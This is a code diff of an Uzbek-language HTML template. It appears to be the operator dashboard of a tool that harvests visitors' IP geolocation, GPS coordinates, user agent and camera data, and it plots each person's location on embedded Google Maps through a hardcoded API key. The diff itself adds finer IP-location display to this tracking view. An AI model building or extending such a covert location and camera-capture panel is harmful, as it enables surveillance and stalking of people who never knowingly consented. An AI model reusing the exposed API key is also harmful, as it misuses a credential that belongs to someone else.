@@ -88,32 +88,53 @@
                     <div class="data-value">{{ item.ip_address }}</div>
                 </div>
                 
+                {% if item.ip_location %}
                 <div class="data-row">
-                    <div class="data-label">💻 User Agent:</div>
-                    <div class="data-value">{{ item.user_agent }}</div>
+                    <div class="data-label">📍 IP Joylashuv:</div>
+                    <div class="data-value">
+                        🏙️ Shahar: {{ item.ip_location.city }}<br>
+                        🗺️ Mintaqa: {{ item.ip_location.region }}<br>
+                        🌍 Mamlakat: {{ item.ip_location.country }}<br>
+                        📌 Koordinatalar: {{ item.ip_location.latitude }}, {{ item.ip_location.longitude }}<br>
+                        🕐 Vaqt mintaqasi: {{ item.ip_location.timezone }}<br>
+                        📡 ISP: {{ item.ip_location.isp }}
+                        
+                        {% if item.ip_location.latitude and item.ip_location.longitude %}
+                        <iframe 
+                            class="map-preview"
+                            src="https://www.google.com/maps/embed/v1/place?key=AIzaSyBFw0Qbyq9zTFTd-tUY6dZWTgaQzuU17R8&q={{ item.ip_location.latitude }},{{ item.ip_location.longitude }}&zoom=12"
+                            frameborder="0">
+                        </iframe>
+                        {% endif %}
+                    </div>
                 </div>
+                {% endif %}
                 
-                {% if item.location %}
+                {% if item.gps_location %}
                 <div class="data-row">
                     <div class="data-label">📍 GPS Joylashuv:</div>
                     <div class="data-value">
-                        {% if item.location.error %}
-                            ❌ Xato: {{ item.location.error }}
+                        {% if item.gps_location.error %}
+                            ❌ Xato: {{ item.gps_location.message or item.gps_location.error }}
                         {% else %}
-                            Latitude: {{ item.location.latitude }}<br>
-                            Longitude: {{ item.location.longitude }}<br>
-                            Aniqlik: {{ item.location.accuracy }} metr
+                            Latitude: {{ item.gps_location.latitude }}<br>
+                            Longitude: {{ item.gps_location.longitude }}<br>
+                            Aniqlik: {{ item.gps_location.accuracy }} metr
                             
-                            <!-- Google Maps preview -->
                             <iframe 
                                 class="map-preview"
-                                src="https://www.google.com/maps/embed/v1/place?key=AIzaSyBFw0Qbyq9zTFTd-tUY6dZWTgaQzuU17R8&q={{ item.location.latitude }},{{ item.location.longitude }}&zoom=15"
+                                src="https://www.google.com/maps/embed/v1/place?key=AIzaSyBFw0Qbyq9zTFTd-tUY6dZWTgaQzuU17R8&q={{ item.gps_location.latitude }},{{ item.gps_location.longitude }}&zoom=15"
                                 frameborder="0">
                             </iframe>
                         {% endif %}
                     </div>
                 </div>
                 {% endif %}
+                
+                <div class="data-row">
+                    <div class="data-label">💻 User Agent:</div>
+                    <div class="data-value">{{ item.user_agent }}</div>
+                </div>
                 
                 {% if item.camera %}
                 <div class="data-row">
